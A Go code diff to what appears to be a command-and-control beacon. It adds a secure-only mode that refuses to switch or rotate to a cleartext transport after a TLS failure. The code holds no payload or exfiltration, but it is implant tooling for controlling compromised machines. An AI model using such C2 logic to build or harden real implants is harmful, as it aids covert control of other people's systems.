@@ -228,6 +228,9 @@ func buildTransportCandidates() []string {
 	primary := effectiveTransport()
 	cands := []string{primary}
 	add := func(t string) {
+		if !c2SecureOnlyTransportAllowed(t) {
+			return
+		}
 		for _, c := range cands {
 			if c == t {
 				return
@@ -269,8 +272,15 @@ func getTransportCandidates() []string {
 }
 
 // applyTransport switches the active transport by setting the globals the
-// beacon dispatcher keys on.
+// beacon dispatcher keys on. In secure-only mode a cleartext transport is
+// refused: downgrading after a TLS failure is the attack we are preventing.
 func applyTransport(name string) {
+	if !c2SecureOnlyTransportAllowed(name) {
+		if Debug {
+			fmt.Printf("[c2] transport switch to %s refused: all configured C2 URLs are encrypted\n", name)
+		}
+		return
+	}
 	switch name {
 	case "tcp":
 		setProtocolAndTransport("tcp", "tcp")
@@ -310,7 +320,7 @@ func maybeRotateTransport() {
 	for i := 0; i < len(cands); i++ {
 		idx = (idx + 1) % len(cands)
 		candidate := cands[idx]
-		if candidate != cur {
+		if candidate != cur && c2SecureOnlyTransportAllowed(candidate) {
 			next = candidate
 			break
 		}
